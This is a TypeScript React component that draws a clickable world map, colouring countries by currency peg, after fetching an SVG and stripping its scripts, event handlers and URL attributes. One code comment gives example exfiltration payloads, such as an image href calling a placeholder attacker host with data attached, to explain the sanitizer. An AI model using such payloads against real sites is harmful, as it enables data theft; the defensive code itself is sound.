"use client";

import { useEffect, useRef, useState, type MouseEvent } from "react";
import { PEG_CHART_COLORS, PEG_LABELS_SHORT } from "@shared/lib/classification";
import type { PegCurrency } from "@shared/types/core";
import { RequestSequence, isRequestCancellation, requestTextWithResponse } from "@/lib/request";

/** ISO-3166 alpha-2 country IDs in `/maps/world-countries.svg` mapped to each fiat peg territory. */
const PEG_COUNTRY_CODES: Partial<Record<PegCurrency, readonly string[]>> = {
  EUR: ["AT", "BE", "CY", "DE", "EE", "ES", "FI", "FR", "GR", "HR", "IE", "IT", "LT", "LU", "LV", "NL", "PT", "SI", "SK"],
  CHF: ["CH"],
  GBP: ["GB"],
  CZK: ["CZ"],
  PLN: ["PL"],
  AED: ["AE"],
  RUB: ["RU"],
  TRY: ["TR"],
  JPY: ["JP"],
  KRW: ["KR"],
  IDR: ["ID"],
  MYR: ["MY"],
  SGD: ["SG"],
  CNH: ["CN"],
  PHP: ["PH"],
  KGS: ["KG"],
  BRL: ["BR"],
  ARS: ["AR"],
  NGN: ["NG"],
  XOF: ["BJ", "BF", "CI", "GW", "ML", "NE", "SN", "TG"],
  CAD: ["CA"],
  MXN: ["MX"],
  ZAR: ["ZA"],
  AUD: ["AU"],
  NZD: ["NZ"],
  COP: ["CO"],
  PEN: ["PE"],
  CLP: ["CL"],
  GHS: ["GH"],
  KES: ["KE"],
  INR: ["IN"],
  VND: ["VN"],
};

const STYLE_BLOCK = `
.fiat-world-map{--world-default-fill:var(--atlas-land);--world-stroke:var(--atlas-coast)}
.fiat-world-map svg{display:block;width:100%;height:100%}
.fiat-world-map .world-countries path{stroke-width:0.75;vector-effect:non-scaling-stroke;transition:fill 180ms ease-out,stroke 180ms ease-out,opacity 180ms ease-out}
.fiat-world-map .world-countries path[data-peg-interactive="true"]{pointer-events:auto;cursor:pointer}
.fiat-world-map .world-countries path[data-peg-interactive="true"]:hover{fill:color-mix(in oklab,var(--peg-region,var(--brand-accent)) 28%,var(--atlas-land));stroke:var(--peg-region,var(--atlas-coast))}
.fiat-world-map .world-countries path[data-peg-selected="true"]{fill:color-mix(in oklab,var(--peg-region,var(--brand-accent)) 44%,var(--atlas-land));stroke:var(--peg-region,var(--atlas-coast));stroke-width:1.2}
`;

// URL-/navigation-bearing attributes that can drive data exfiltration or
// navigation from a poisoned SVG (e.g. <a href="javascript:…">,
// <image href="https://attacker/?data=…">, <use href="#…">). The static
// world-countries map is pure geometry and never needs these.
const UNSAFE_ATTRS = new Set(["href", "xlink:href", "src", "action", "formaction", "data"]);

// Sanitize parsed SVG: strip <script> elements, on* event-handler attributes,
// and URL-/navigation-bearing attributes.
// Defense-in-depth against a poisoned /maps/world-countries.svg response.
function sanitizeSvg(root: Element): void {
  root.querySelectorAll("script").forEach((el) => el.remove());
  const walker = root.ownerDocument.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
  let node: Node | null = root;
  while (node) {
    if (node instanceof Element) {
      for (const attr of Array.from(node.attributes)) {
        const name = attr.name.toLowerCase();
        if (name.startsWith("on") || UNSAFE_ATTRS.has(name)) node.removeAttribute(attr.name);
      }
    }
    node = walker.nextNode();
  }
}

export interface WorldMapProps {
  selectedPeg?: PegCurrency | null;
  activePegs?: readonly PegCurrency[];
  onSelectPeg?: (peg: PegCurrency | null) => void;
}

export function WorldMap({
  selectedPeg = null,
  activePegs,
  onSelectPeg,
}: WorldMapProps = {}) {
  const hostRef = useRef<HTMLDivElement | null>(null);
  const [svgGeneration, setSvgGeneration] = useState(0);

  useEffect(() => {
    const requests = new RequestSequence();
    const host = hostRef.current;
    if (!host) return;

    requests
      .run((signal) => requestTextWithResponse("/maps/world-countries.svg", { signal }))
      .then(({ data: text }) => text)
      .then((text) => {
        if (!text) return;
        // Parse via DOMParser into an isolated XML document, sanitize, then
        // adopt the <svg> node. Avoids `dangerouslySetInnerHTML` entirely.
        const doc = new DOMParser().parseFromString(text, "image/svg+xml");
        const svg = doc.documentElement;
        if (!svg || svg.nodeName.toLowerCase() !== "svg") return;
        sanitizeSvg(svg);
        host.replaceChildren(host.ownerDocument.importNode(svg, true));
        setSvgGeneration((gen) => gen + 1);
      })
      .catch((error) => {
        if (isRequestCancellation(error)) return;
        // swallow: empty atlas is acceptable fallback
      });

    return () => {
      requests.cancel();
    };
  }, []);

  useEffect(() => {
    const host = hostRef.current;
    if (!host) return;
    const svg = host.querySelector("svg");
    if (!svg) return;

    const countryToPeg = new Map<string, PegCurrency>();
    const allowedPegs = activePegs ? new Set(activePegs) : null;
    for (const [pegKey, codes] of Object.entries(PEG_COUNTRY_CODES) as [PegCurrency, readonly string[]][]) {
      if (allowedPegs && !allowedPegs.has(pegKey)) continue;
      for (const code of codes) {
        countryToPeg.set(code, pegKey);
      }
    }

    const paths = svg.querySelectorAll<SVGElement>(".world-countries path[id]");
    paths.forEach((path) => {
      const code = path.getAttribute("id");
      const peg = code ? countryToPeg.get(code) : undefined;
      if (!peg) {
        path.removeAttribute("data-peg");
        path.removeAttribute("data-peg-interactive");
        path.removeAttribute("data-peg-selected");
        if (path.style) path.style.removeProperty("--peg-region");
        else path.removeAttribute("style");
        return;
      }
      const colorHex = PEG_CHART_COLORS[peg]?.hex ?? PEG_CHART_COLORS.OTHER.hex;
      path.setAttribute("data-peg", peg);
      if (onSelectPeg) {
        path.setAttribute("data-peg-interactive", "true");
        path.setAttribute("aria-label", `Filter by ${PEG_LABELS_SHORT[peg] ?? peg}`);
      } else {
        path.removeAttribute("data-peg-interactive");
      }
      if (path.style) path.style.setProperty("--peg-region", colorHex);
      else path.setAttribute("style", `--peg-region: ${colorHex}`);
      if (selectedPeg === peg) {
        path.setAttribute("data-peg-selected", "true");
      } else {
        path.removeAttribute("data-peg-selected");
      }
    });
  }, [svgGeneration, selectedPeg, activePegs, onSelectPeg]);

  const handleMapClick = (event: MouseEvent<HTMLDivElement>) => {
    if (!onSelectPeg) return;
    const target = (event.target as Element | null)?.closest<SVGElement>("[data-peg-interactive='true']");
    if (!target) return;
    const peg = target.getAttribute("data-peg") as PegCurrency | null;
    if (!peg) return;
    onSelectPeg(selectedPeg === peg ? null : peg);
  };

  return (
    <div
      className="fiat-world-map relative h-full w-full"
      aria-hidden={!onSelectPeg}
      onClick={handleMapClick}
    >
      <style>{STYLE_BLOCK}</style>
      <div ref={hostRef} className="h-full w-full overflow-hidden [&_svg]:block [&_svg]:h-full [&_svg]:w-full" />
    </div>
  );
}
